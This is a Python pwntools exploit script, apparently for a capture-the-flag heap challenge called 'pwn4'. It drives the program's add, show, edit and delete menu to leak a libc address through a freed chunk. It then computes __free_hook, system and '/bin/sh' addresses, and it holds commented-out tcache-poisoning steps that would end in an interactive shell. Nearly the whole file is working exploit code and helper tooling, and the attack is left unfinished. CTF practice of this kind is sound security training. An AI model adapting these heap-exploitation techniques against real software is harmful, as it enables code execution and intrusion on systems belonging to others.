# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './pwn4'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 1
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def boom( pwn ):
    context.update( os = 'linux', arch = 'amd64',timeout = 1)
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla(':',num)

def add(idx , key , value = 0x1234 ):
    cmd(1)
    sla('index:' , idx)
    sla('name:' , 'aaaa')
    sla('key:' , key)
    sla('value:' , value)

def show(idx):
    cmd(2)
    sla('index:' , idx)

def edit(idx , length , key , value ):
    cmd(3)
    sla('index:' , idx)
    sla('name:' , 'aaaa')
    sla('length:' , length)
    sla('Key:' , key)
    sla('Value:' , value)

def delete(idx):
    cmd(4)
    sla('index:' , idx)

# one_gad = one_gadget(libc.path)

def attack():
    
    add( 0 , 'b'*0x410 )
    add( 1 , 'b'*0x410 )
    add( 2 , 'b'*0x410 )


    add( 3 , 'a'*0x3d0) ###
    add( 4 , 'a'*0x270)

    delete(1)
    show(1)

    __malloc_hook = l64() - 0x70
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    binsh_addr = libc.search('/bin/sh').next()
    lg('__free_hook',__free_hook)

    add( 5 , 'b'*0x30 )
    add( 6 , 'b'*0x30 )
    delete(5)
    delete(6)
    
    dbg()
    # show(6)

    # ru('Key: ')
    # heap_base = uu64(6) - 0x139f0
    # lg('heap_base',heap_base)

    # edit( 5 , 6 , p64(heap_base + 0x131f0 ) [:-2] , 0x1 )
    # add( 7 , 'x'*0x28)
    # edit( 7 , 8 , p64(__free_hook - 0x8) , 1)

    # add(8 , 'a'*0x30)
    # add(9 , 'a'*0x30)
    # add(10 , 'a'*0x30)
    # add(11 , 'a'*0x30)
    # add(12 , 'a'*0x30)
    # add(14 , 'a')
    # add(15 , 'a')

    # for i in range(8 , 12):
    #     delete(i)
    # delete(14)
    # delete(15)

    # for i in range(5 , 5 + 10):
    #     add(i , 'a'*0x1f0)

    # for i in range(5 , 5 + 10):
    #     delete(i )
    
    # add(7 , 'a'*0x300)

    # edit(15 , 6 , p64(heap_base + 0x16330  + 8) [:-2] , 1)
    # add(15 , 'a')
    # add(11 , p64(__free_hook - 0x20))

    # for i in range(6 , 6 + 5):
    #     add(i , 'a'*0x1f0)

    # delete(0)

    # add(0 , 'a'*0x1f0)
    # dbg()

    
    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   pwn4.py
@Time    :   2022/01/09 21:31:49
@Author  :   Niyah 
'''